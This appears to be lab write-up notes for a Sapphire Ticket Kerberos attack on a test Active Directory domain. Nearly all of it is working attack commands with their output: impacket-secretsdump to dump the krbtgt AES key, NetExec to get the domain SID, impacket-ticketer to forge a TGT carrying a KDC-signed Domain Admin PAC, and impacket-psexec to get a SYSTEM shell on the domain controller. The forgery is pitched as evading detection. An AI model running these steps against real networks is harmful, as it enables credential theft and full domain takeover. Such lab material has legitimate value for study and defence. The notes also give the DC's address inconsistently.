Sapphire Ticket


Sapphire Ticket Attack (Evasive Persistence)

  1. 1.

    1. Concept & Objective

Objective: To forge an undetectable Ticket Granting Ticket (TGT) that bypasses modern Active Directory PAC (Privilege Attribute Certificate) signature validation checks by forcing the KDC to legitimately generate the high-privileged PAC for us.

Concept: While a Golden Ticket is entirely forged and a Diamond Ticket manually modifies an existing PAC, modern Windows Domain Controllers (patched against recent CVEs) employ strict PAC signature validation. If the PAC signatures don't perfectly align with the KDC's expectations, the ticket is rejected. The Sapphire Ticket elegantly bypasses this. It leverages Kerberos extensions (S4U2self and U2U):

  1. The attacker uses a standard compromised user (e.g., tanjiro_kamado21) to request a legitimate TGT.

  1. They use S4U2self to request a Service Ticket to themselves, on behalf of a highly privileged user (e.g., madara_uchiha91).

  1. The KDC generously obliges, generating a mathematically perfect, fully signed PAC for the Domain Admin.

  1. The attacker decrypts this Service Ticket, extracts the pristine Domain Admin PAC, and embeds it into a forged TGT signed with the stolen krbtgt key. Result: The forged TGT contains a PAC that was actually generated and signed by the KDC, making it virtually impossible to distinguish from legitimate administrative traffic.

  1. 2.

    2. Prerequisites (Credential Theft & Enumeration)

To construct a Sapphire Ticket, we need the krbtgt encryption keys, the Domain SID, a standard user account to perform the S4U2self request, and the target high-privileged user to impersonate.

Step 1: Extracting the krbtgt Keys

Tool: impacket-secretsdump

Command:

impacket-secretsdump 'shinobi.local'/madara_uchiha91:Rinnegan@War@192.168.56.10 -just-dc-user krbtgt -outputfile krbtgt_hash

Findings: We targeted the DC and successfully dumped the krbtgt account secrets. We obtained the essential AES-256 key (297d8e7974352d17756e706cf95ee68267732ff07bc877a422102da0f2aee939) required to sign the final ticket.

Step 2: Enumerating the Domain SID

Tool: NetExec (nxc)

Command:

nxc ldap 192.168.56.10 -u madara_uchiha91 -p Rinnegan@War --get-sid

Findings: We queried LDAP and confirmed the Domain SID is S-1-5-21-4057973084-1432748986-1156288224.

  1. 3.

    3. Attack Execution: The Sapphire Forgery

Objective: Use a standard account (tanjiro_kamado21) to trick the KDC into generating a legitimate PAC for the privileged account (madara_uchiha91), extract it, and construct the evasive TGT.

Tool: impacket-ticketer

Command:

impacket-ticketer -request -impersonate madara_uchiha91 -domain shinobi.local -user tanjiro_kamado21 -password 'Hinokami@456' -nthash '0ae14ac4a8c66ca241ba7f25162a9ea2' -aesKey '297d8e7974352d17756e706cf95ee68267732ff07bc877a422102da0f2aee939' -domain-sid 'S-1-5-21-4057973084-1432748986-1156288224' baduser

Findings: The tool recognizes the flags and outputs: [-] doing sapphire ticket.

  • It decrypts the ticket, extracts the perfect PAC, packages it into a new TGT using the krbtgt AES key, and saves it as baduser.ccache.

  1. 4.

    4. Attack Verification & Weaponization

Objective: Load the Sapphire Ticket into memory and verify it grants full domain compromise.

Step 1: Injecting the Payload & Validating Properties

Command:

export KRB5CCNAME=baduser.ccache
klist -e

Findings: We exported the ticket to the environment. The klist -e output confirms the default principal is madara_uchiha91@SHINOBI.LOCAL and that the ticket utilizes the highly secure aes256-cts-hmac-sha1-96 encryption for both the session key and the ticket itself, perfectly blending in with modern Kerberos enforcement.

Step 2: Execution via psexec

Tool: impacket-psexec

Command:

impacket-psexec shinobi.local/madara_uchiha91@dc01.shinobi.local -dc-ip 192.168.56.10 -target-ip 192.168.56.10 -k -no-pass

Findings: By leveraging the Sapphire Ticket via Kerberos authentication (-k), we bypassed all password requirements and seamlessly authenticated to the Domain Controller.

  • psexec successfully accessed the ADMIN$ share, uploaded the service executable, and spawned a shell.

  • Executing whoami verified we achieved nt authority\system on DC01 (10.0.3.15).
